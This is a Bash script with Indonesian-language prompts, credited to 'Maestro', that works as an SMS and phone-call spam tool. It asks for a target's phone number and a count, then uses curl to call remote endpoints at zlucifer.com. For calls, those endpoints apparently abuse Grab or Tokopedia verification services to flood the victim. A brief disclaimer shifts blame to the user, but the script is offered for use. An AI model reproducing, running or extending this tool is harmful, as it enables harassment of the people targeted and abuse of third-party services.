#!/bin/bash
#PERINGATAN : KESALAHAN ATAU KEJAHATAN ADALAH TANGGUNG JAWAB DARI PEMAKAI
#GUNAKAN TOOLS UNTUK KEBAIKAN JANGAN DISALAH GUNAKAN :)
troll(){
    clear

echo "
╔═╗┌─┐┌─┐┌┬┐ 
╚═╗├─┘├─┤│││ 
╚═╝┴  ┴ ┴┴ ┴"
echo "[!]PERINGATAN : Jangan di salah Gunakan Ya kentod!"
    sleep 0.03
    echo "[{}]=========================[{}]"
    sleep 2
    echo "Autho : Maestro"
    echo "Facebook :Maestro"
    echo "Type :Spam Call/SMS"
    sleep 0.7
    echo $blue"[{}]=========================[{}]"
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
get_sms=$(curl -s http://zlucifer.com/api/sms.php)
get_call=$(curl -s http://zlucifer.com/api/call.php)
mulai (){
    echo "[+]Gunakan Tools Lagi?"
    echo "[!]y/n"
    echo
    read lagi
    if [ $lagi = "y" ]; then
            spam
    else
            echo "[*]Terimakasih sudah menggunakan Tools nya"
    fi
}
#spam
spam(){
    clear
    troll
    echo
    echo "{===============}"
    echo "[1] Spam SMS"
    echo "[2] Spam Telp"
    echo "[3] exit"
    echo "{===============}"
    echo
    echo "[!]1/2/3"
    read pilih
    if [ $pilih = "1" ]; then
            echo " Spam SMS"
            #function spam
            echo
            echo "Silahkan masukan nomor  Target"
            echo misal... 0813123456789
            read target # masukin no telp
            echo
            echo "Jumbal Spam yang di Inginkan?"
            read paket
            echo
            echo Apakah nomor $target "dan SMS dikirim "$paket" benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                    load
                    clear
                    echo Melakukan spam SMS ke nomor $target
                    echo
                    echo "Tunggu sampai selesai Jangan di Keluarkan!"
                    echo "========================================"
                    target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
                    echo " Gunakan tools dengan Bijaksana" | lolcat
                    echo
                    echo " Tools By: "
                    echo " -Maestro-"
                    echo "======================================="
            else
                    echo "ERORR"
            fi
        mulai
    elif [ $pilih = "2" ]; then
            echo "Troll Spam Call"
            #function spam
            echo
            echo "Silahkan masukan nomor  Target"
            echo misal... 08136047xxxx
            read target # masukin no telp
            echo
            echo "Gunakan API Grab/Toped?"
            echo "{=============}"
            echo "[1] GRAB"
            echo "[2] TOPED"
            echo "{=============}"
            echo "[!]1/2"
            read api
            if [ $api = "1" ]; then
                  api_spam="grab"
            else
                  api_spam="toped"
            fi
            echo Apakah nomor $target dan spam menggunakan $api_spam " benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                  load
                  clear
                  echo Melakukan spam call ke nomor $target
                  echo
                  echo "Tunggu sampai selesai Jangan di Keluarkan!"
                  echo "========================================"
                  cek_target=`curl -s $get_call/call.php?nomor=$target"&method="$api_spam`
                  echo -e $cek_target
                  echo " Gunakan tools dengan bijaksana"
                  echo
                  echo " Tools By: Maestro"
                  echo " -Maestro-"
                  echo "========================================"
            else
                  echo Erorr, silahkan coba lagi...
            fi
        mulai
    elif [ $pilih = "3" ]; then
        echo "Terimakasih sudah menggunakan Tools Kami"
        close
    else
        clear
        echo "ERORR"
        mulai
    fi
}
close(){
    exit
}
clear
echo "Loading.."
load
clear
troll
echo Selamat datang Jones :v, Siapa nama? #tulisan keluar
read nick #membaca yang ditulis
clear
troll
echo Selamat datang $nick ",Jones :v"
echo
echo "Mulai Tools?"
echo "y/n?"
read mulai
if [ $mulai = "y" ]; then
      spam
else
      close
fi
